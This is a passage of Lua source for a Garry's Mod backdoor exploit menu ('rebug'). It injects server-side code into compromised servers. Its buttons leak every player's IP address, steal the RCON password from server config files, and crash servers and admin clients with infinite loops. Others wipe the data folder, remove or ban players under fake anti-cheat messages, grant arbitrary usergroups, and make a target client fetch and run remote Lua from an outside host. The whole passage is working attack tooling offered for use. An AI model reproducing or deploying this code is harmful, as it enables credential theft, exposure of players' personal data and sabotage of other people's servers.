            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			local id = ]] .. LocalPlayer():UserID() .. [[
				for k, v in pairs(player.GetAll()) do
					Player(id):ChatPrint("Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress())
				end

				]])
        end)

        rebug.AddButton("Toggle all doors", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"}

			for k, v in pairs(ents.GetAll()) do
				if table.HasValue(doors, v:GetClass()) then
					v:Fire("toggle", "", 0)
				end
			end
			
			]])
        end)

        rebug.AddButton("Lock all doors", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"}

			for k, v in pairs(ents.GetAll()) do
				if table.HasValue(doors, v:GetClass()) then
					v:Fire("lock", "", 0)
				end
			end
			
			]])
        end)

        rebug.AddButton("Unlock all doors", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"}

			for k, v in pairs(ents.GetAll()) do
				if table.HasValue(doors, v:GetClass()) then
					v:Fire("unlock", "", 0)
				end
			end
			
			]])
        end)

        rebug.AddButton("Vaporize all players", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

				for k, v in pairs(player.GetAll()) do
					v:Remove()
				end

			]])
        end)

        rebug.AddButton("WhiteList Everything", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

				if FPP then
					for k, v in pairs(FPP.Blocked) do
						for r, g in pairs(v) do
							RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)
						end
					end
				end

			]])
        end)

        rebug.AddButton("Wipe data folder", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			local files, directories = file.Find("*", "DATA")

			for k, v in pairs(files) do
				file.Delete(v)
			end
			
			]])
        end)

        rebug.AddButton("ULX Unban SteamID", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("ULX Unban SteamID", "SteamID", "", function(str)
                noob.PostLua([[
				
				ULib.unban("]]..str..[[")
				
				]])
            end)
        end)

/*
*	Panel 3: RCON Backdoors
*/
        local List13 = vgui.Create("DPanelList", VoidPlate)
        List13:SetPos(235, 155)
        List13:SetSize(180, 430)
        List13:SetPadding(2)
        List13:SetSpacing(2)
        List13:EnableHorizontal(false)
        List13:EnableVerticalScrollbar(true)
        List13:SetName("")

        List13.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local item2 = vgui.Create("DPanelList", List13)
        item2:SetPos(10, 8)
        item2:SetSize(170, 420)
        item2:SetPadding(2)
        item2:SetSpacing(2)
        item2:EnableHorizontal(false)
        item2:EnableVerticalScrollbar(true)
        item2:SetName("")

        local scann = vgui.Create("DButton", VoidPlate)
        scann:SetFont("Trebuchet18")
        scann:SetText("Backdoor Scan")
        scann:SetTextColor(Color(255, 255, 255, 255))
        scann:SetPos(235, 637)
        scann:SetSize(180, 40)

        scann.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        scann.DoClick = function()
            surface.PlaySound("buttons/button18.wav")
            CheckBackdoors()
        end

        local Bar2 = vgui.Create("DScrollPanel", item2)
        Bar2:Dock(FILL)
        local sBar2 = Bar2:GetVBar()
        function sBar2:Paint()
        end
        function sBar2.btnUp:Paint()
        end
        function sBar2.btnDown:Paint()
        end
        function sBar2.btnGrip:Paint()
        end

        -- RCON Backdoors
        rebug.AddButton("Rcon Stealer", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
				util.AddNetworkString("rvac.rcon_passw_dump")
				util.AddNetworkString("REBUG")
				util.AddNetworkString("rvac.aucun_rcon_ici")

				net.Receive("REBUG", function()
					local RconPassword

					if file.Exists("cfg/server.cfg", "GAME") then
						for k, v in pairs(string.Explode("\n", file.Read("cfg/server.cfg", "GAME"))) do
							if string.find(v, "rcon_password") then
								RconPassword = v
							end
						end
					end

					if not RconPassword and file.Exists("cfg/autoexec.cfg", "GAME") then
						for k, v in airs(string.Explode("\n", file.Read("cfg/autoexec.cfg", "GAME"))) do
							if string.find(v, "rcon_password") then
								RconPassword = v
							end
						end
					end

					if RconPassword ~= nil then
						net.Start("rvac.rcon_passw_dump")
						net.WriteString(RconPassword)
						net.Broadcast()
					else
						net.Start("rvac.aucun_rcon_ici")
						net.Broadcast()
					end
				end)
			
			]])

			timer.Simple(0.5, function()
				if CheckIfStringExists("REBUG") then
					net.Start("REBUG")
					net.SendToServer()
				else
					chat.AddText(Color(255, 0, 0), "RCON password not found, try again")
				end
			end)

            net.Receive("rvac.rcon_passw_dump", function()
                local rcon_pass = net.ReadString()
                chat.AddText(Color(255, 0, 0), "[", "REBUG", "] ", Color(20, 150, 200), "" .. rcon_pass)
            end)

            net.Receive("rvac.aucun_rcon_ici", function()
                chat.AddText(Color(255, 0, 0), "[", "REBUG", "] ", Color(220, 100, 100), "RCON not found in cfg folder :(")
            end)
		end)

        rebug.AddButton("Crash Server", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			while true do end
			
			]])
            rprint("The server has been crashed gg")
        end)

        rebug.AddButton("Crash Admins", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:SendLua("while true do end") end end
			
			]])
        end)

        rebug.AddButton("Server Name", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Hostname", "Chance server name to anything", "", function(str)
                noob.PostLua([[
				
				sv_hostname("]]..str..[[")
				
				]])
            end)
        end)

        rebug.AddButton("Reset all money", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			RunConsoleCommand("rp_resetallmoney")
			
			]])
        end)

        rebug.AddButton("SV ClientSide", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("SV ClientSide", "1 = Enabled // 0 = Disabled", "", function(str)
            noob.PostLua([[
			
			RunConsoleCommand("sv_allowcslua","]]..str..[[")
			
			]])
			end)
		end)

        rebug.AddButton("SV Password", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			RunConsoleCommand('sv_password',']]..noobstr..[[')
			
			]])
			rprint("Password: " .. noobstr)
		end)

        rebug.AddButton("LogEcho", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("LogEcho", "1 = Enabled // 0 = Disabled", "", function(str)
            noob.PostLua([[
			
			RunConsoleCommand('ulx','logecho',']]..str..[[')
			
			]])
			end)
		end)

        rebug.AddButton("SV Friction", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("SV Friction", "e.g 8", "", function(str)
            noob.PostLua([[
			
			RunConsoleCommand('sv_friction',']]..str..[[')
			
			]])
			end)
		end)

        rebug.AddButton("SV Gravity", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("SV Gravity", "e.g -600", "", function(str)
            noob.PostLua([[
			
			RunConsoleCommand('sv_gravity',']]..str..[[')
			
			]])
			end)
		end)

        rebug.AddButton("Giant Players", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

				hook.Add("Think", "tall", function()
					for k, v in pairs(player.GetAll()) do
						v:SetModelScale(0.2, 80)
						v:SetRunSpeed(400 * 2)
						v:SetWalkSpeed(200 * 2)
					end
				end)
			]])
        end)

        rebug.AddButton("Speed Hack All", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

				hook.Add("Think", "speedhack", function()
					for k, v in pairs(player.GetAll()) do
						v:SetRunSpeed(400 * 4)
						v:SetWalkSpeed(200 * 2)
					end
				end)

				]])
        end)

        rebug.AddButton("Force Say All", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Force Say", "Make everyone say anything", "", function(str)
                noob.PostLua([[
				
				for k,v in pairs(player.GetAll()) do v:ConCommand(]]..str..[[)end
				
				]])
            end)
        end)

        rebug.AddButton("Force Dance All", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
                for k, v in pairs(player.GetAll()) do
                    v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
                end
                
                timer.Create("]]..noobstr..[[", 8.9, 0, function()
                    for k, v in pairs(player.GetAll()) do
                        v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
                    end
                end)

			]])
        end)

        rebug.AddButton("Force Retry All", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			for k, v in pairs(player.GetAll()) do
				v:ConCommand("retry")
			end

			]])
        end)

/*
*	Panel 4 : Targeting Backdoors
*/
        local List3 = vgui.Create("DPanelList", VoidPlate)
        List3:SetPos(473, 155)
        List3:SetSize(180, 430)
        List3:SetPadding(2)
        List3:SetSpacing(2)
        List3:EnableHorizontal(false)
        List3:EnableVerticalScrollbar(true)
        List3:SetName("")

        List3.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local item3 = vgui.Create("DPanelList", List3)
        item3:SetPos(14, 8)
        item3:SetSize(163, 420)
        item3:SetPadding(2)
        item3:SetSpacing(2)
        item3:EnableHorizontal(false)
        item3:EnableVerticalScrollbar(true)
        item3:SetName("")

        item3.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetDrawColor(35, 35, 35, 0)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local board = vgui.Create("DButton", VoidPlate)
        board:SetFont("Trebuchet18")
        board:SetText("SoundBoard")
        board:SetTextColor(Color(255, 255, 255, 255))
        board:SetPos(473, 637)
        board:SetSize(180, 40)

        board.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        board.DoClick = function()
            soundboard()
            Void:SetVisible(false)
        end

        local Bar3 = vgui.Create("DScrollPanel", item3)
        Bar3:Dock(FILL)
        local sBar3 = Bar3:GetVBar()
        function sBar3:Paint()
        end
        function sBar3.btnUp:Paint()
        end
        function sBar3.btnDown:Paint()
        end
        function sBar3.btnGrip:Paint()
        end

        rebug.AddButton("Allahu Ackbar", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[ 

				local explo = ents.Create("env_explosion")
				local me = Player(]]..selPly..[[)
				
					explo:SetOwner(me)
					explo:SetPos(me:GetPos())
					explo:SetKeyValue("iMagnitude", "250")
					explo:Spawn()
					explo:Activate()
					explo:Fire("Explode", "", 0)

				if me:Alive() then
					me:Kill()
				end

			]])
        end)

        rebug.AddButton("Co Host Menu", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			Player(]]..selPly..[[):SendLua('http.Fetch("https://rvac.cc/log1n/bd.lua",RunString))')
			
			]])
        end)
		
        rebug.AddButton("Cleanup Props", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			Player(]]..selPly..[[):ConCommand("gmod_cleanup")
			
			]])
        end)

        rebug.AddButton("Crash Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			Player(]]..selPly..[[):SendLua("function die() return die() end die()")
			
			]])
        end)

        rebug.AddButton("Change Model", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Change Model", "PlayerModel .mdl", "", function(str)
			noob.PostLua([[
			
			local mdls = Player(]]..selPly..[[)
				mdls:SetModel("]]..str..[[")
				
				]])
            end)
        end)

        rebug.AddButton("Drop Weapon", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			Player(]]..selPly..[[):DropWeapon(Player(]] .. selPly .. [[):GetActiveWeapon())
			
			]])
        end)

        rebug.AddButton("Force Say", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Force Say", "e.g /ooc Hi", "", function(str)
            noob.PostLua([[
			
			Player(]]..selPly..[[):Say("]]..str..[[")
			
			]])
			end)
		end)

        rebug.AddButton("Force Retry", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			Player("]]..selPly..[["):ConCommand("retry")
			
			]])
        end)
		
        rebug.AddButton("Force Command", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Force Command", "e.g disconnect", "", function(str)
            noob.PostLua([[
			
			Player("]]..selPly..[["):ConCommand("]]..str..[[")
			
			]])
			end)
		end)

        rebug.AddButton("Noclip Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

				local me = Player("]]..selPly..[[")

				if me:GetMoveType() ~= MOVETYPE_NOCLIP then
					me:SetMoveType(MOVETYPE_NOCLIP)
				else
					me:SetMoveType(MOVETYPE_WALK)
				end

				]])
        end)

        rebug.AddButton("Set UserGroup", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Set UserGroup", "e.g superadmin", "", function(str)
            noob.PostLua([[
			
			Player(]]..selPly..[[):SetUserGroup("]]..str..[[")
			
			]])
			end)
		end)

        rebug.AddButton("Speed Hack", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			local me = Player(]]..selPly..[[)
				if not me.Sanic then
					me:SetRunSpeed(1200)
					me:SetWalkSpeed(800)
					me.Sanic = true
				else
					me:SetRunSpeed(240)
					me:SetWalkSpeed(160)
					me.Sanic = false
				end

				]])
        end)

        rebug.AddButton("Teleport (blink)", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			local me = Player(]]..selPly..[[)
				local tps = me:GetEyeTraceNoCursor().HitPos
				me:SetPos(tps)

				]])
        end)

        rebug.AddButton("Infinite Ammo", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
			noob.PostLua([[

				timer.Create("ia_]]..noobstr..[[", 0.01, 0, function()
					local p = Player("]]..selPly..[[")

					if IsValid(p) and p:Alive() then
						local w = p:GetActiveWeapon()

						if IsValid(w) then
							w:SetClip1(w:GetMaxClip1())
						end
					end
				end)

			]])
		end)
		
        rebug.AddButton("Rapid Fire", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
			noob.PostLua([[

				timer.Create("rf_]]..noobstr..[[", 0.01, 0, function()
					local p = Player("]]..selPly..[[")

					if p and IsValid(p) and p:Alive() then
						local w = p:GetActiveWeapon()

						if IsValid(w) then
							w:SetNextPrimaryFire(CurTime())
							w:SetNextSecondaryFire(CurTime())
						end
					end
				end)

				]])
		end)
		
        rebug.AddButton("Set Money", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
			Derma_StringRequest("Give Money", "Remove = - // Add = +", "", function(str)
            noob.PostLua([[
			
			local ree = Player("]]..selPly..[[") ree:addMoney("]]..str..[[")
			
			]])
			end)
		end)
		
        rebug.AddButton("Give Weapons", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
				Derma_StringRequest("Give Weapon", "Weapon ID", "", function(str)
				noob.PostLua([[
				
				local weps = Player("]]..selPly..[[")
				weps:Give("]]..str..[[")
				
				]])
			end)
		end)
		
        rebug.AddButton("Give Ammo", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
				noob.PostLua([[
				
					local ply = %s
						for i=1,100 do
						ply:GiveAmmo(10000, i, false)
					end
				]])
		end)

        rebug.AddButton("M9K Nuke", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
				noob.PostLua([[

				local nuke = ents.Create("m9k_davy_crockett_explo")
				local me = Player("]]..selPly..[[")

					nuke:SetPos(me:GetPos())
					nuke:SetOwner(me)
					nuke.Owner = me
					nuke:Spawn()
					nuke:Activate()

				]])
		end)

        rebug.AddButton("Remove User", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			Player(]]..selPly..[[):SetUserGroup("user"))
			
			]])
        end)

        rebug.AddButton("Enable Godmode", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			Player(]]..selPly..[[):GodEnable()
			
			]])
        end)

        rebug.AddButton("Disable Godmode", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			Player(]]..selPly..[[):GodDisable()
			
			]])
        end)

        rebug.AddButton("Kick Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[
			
			Player(]]..selPly..[[):Kick("[CAC] Truth Engineering")
			
			]])
        end)

        rebug.AddButton("Kill Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			Player(]]..selPly..[[):Kill()

			]])
        end)

        rebug.AddButton("Ban Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			Player(]]..selPly..[[):Ban("[CAC] Kone Bypass Detected!")

			]])
        end)

        rebug.AddButton("Freeze Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			Player(]]..selPly..[[):Freeze(true)

			]])
        end)

        rebug.AddButton("UnFreeze Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			Player(]]..selPly..[[):Freeze(false)

			]])
        end)

        rebug.AddButton("Ignite Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[

			Player(]]..selPly..[[):Ignite(30,40)

			]])
        end)

/*
*	Panels 5 : Player List
*/

        local targeting = vgui.Create("DLabel", VoidPlate)
        targeting:SetFont("Trebuchet18")
        targeting:SetText("No Player Selected")
        targeting:SetTextColor(Color(255, 255, 255))
        targeting:SetPos(690, 560)
        targeting:SizeToContents()
		
        local List4 = vgui.Create("DPanelList", VoidPlate)
        List4:SetPos(693, 155)
        List4:SetSize(180, 400)
        List4:SetPadding(2)
        List4:SetSpacing(2)
        List4:EnableHorizontal(false)
        List4:EnableVerticalScrollbar(true)
        List4:SetName("")

        List4.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local item4 = vgui.Create("DPanelList", List4)
        item4:SetPos(5, 8)
        item4:SetSize(170, 390)
        item4:SetPadding(2)
        item4:SetSpacing(2)
        item4:EnableHorizontal(false)
        item4:EnableVerticalScrollbar(true)
        item4:SetName("")

        item4.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetDrawColor(35, 35, 35, 0)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local Bar4 = vgui.Create("DScrollPanel", item4)
        Bar4:Dock(FILL)
        local sBar4 = Bar4:GetVBar()

        function sBar4:Paint()
        end

        function sBar4.btnUp:Paint()
        end

        function sBar4.btnDown:Paint()
        end

        function sBar4.btnGrip:Paint()
        end

        for k, v in pairs(player.GetAll()) do
            rebug.AddButton(v:Name(), Bar4, function()
                selPly = v:UserID()
                targeting:SetText("Selected: " .. Player(selPly):Name())
            end)
        end

/*
*	Menu Close Function
*/

        function CloseMenu()
            MenuOpen = false
            Void:Close()
        end
    end

    rebug.voidz(true)
end)
